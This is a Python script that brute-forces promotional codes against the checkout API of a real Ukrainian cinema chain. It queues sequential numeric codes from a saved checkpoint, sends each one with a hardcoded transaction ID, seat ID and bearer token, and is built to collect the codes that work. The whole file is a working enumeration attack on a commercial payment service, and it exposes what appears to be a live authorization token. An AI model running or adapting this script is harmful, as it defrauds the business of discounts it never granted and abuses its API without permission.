import aiohttp
import json
import asyncio
import async_timeout
import functools


DB_NAME = 'db.json'
VALID_CODES = []

TRANSACTION_ID = 22077514
SEAT_ID = 100010
BATCH_SIZE = 100

QUEUE_SIZE = 400

queue = asyncio.Queue()


def fill_queue():
    with open(DB_NAME) as f:
        LAST_SAVEPOINT = int(json.loads(f.read())['lastSavepoint'])
    for i in range(QUEUE_SIZE):
        code = LAST_SAVEPOINT + i + 1
        queue.put_nowait(code)


def check_result(future, code=None):
    print('Done', code)
    # result = future.result()
    # mes = result['data']['user_Message']
    # if 'не знайдено' in mes:
    #     print(code, 'is invalid')
    # else:
    #     print(result)
    #     VALID_CODES.append(str(code))


async def jumbotron():
    while not queue.empty():
        code = await queue.get()
        fut = asyncio.ensure_future(query_code(code))
        callback = functools.partial(check_result, code=code)
        fut.add_done_callback(callback)
        await fut

    print('Saving results back to database')
    with open(DB_NAME) as f:
        data = json.loads(f.read())
        data['validCodes'].extend(VALID_CODES)
        last_savepoint = int(data['lastSavepoint'])
        data['lastSavepoint'] = str(last_savepoint + QUEUE_SIZE)

    with open(DB_NAME, 'w') as f:
        f.write(json.dumps(data, indent=2))


async def get_json(session, url, params=None, headers=None):
    params = params or {}
    headers = headers or {}
    async with async_timeout.timeout(10):
        async with session.get(url, params=params,
                               headers=headers) as response:
            return await response.json()


async def query_code(code):
    # await asyncio.sleep(code % 9)
    url = 'https://pay.planetakino.ua/api/v1/cart/check-promocode'
    params = {
        'transactionId': TRANSACTION_ID,
        'promoCode': code,
        'theaterId': 'imax-kiev',
        'seatId': SEAT_ID,
    }
    headers = {
        'authorization': 'Bearer 4f6507711933412ba688b6c7849dff99',
    }
    async with aiohttp.ClientSession() as session:
        result = await get_json(session, url, params, headers)
        return result


async def run():
    fill_queue()
    await jumbotron()


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())

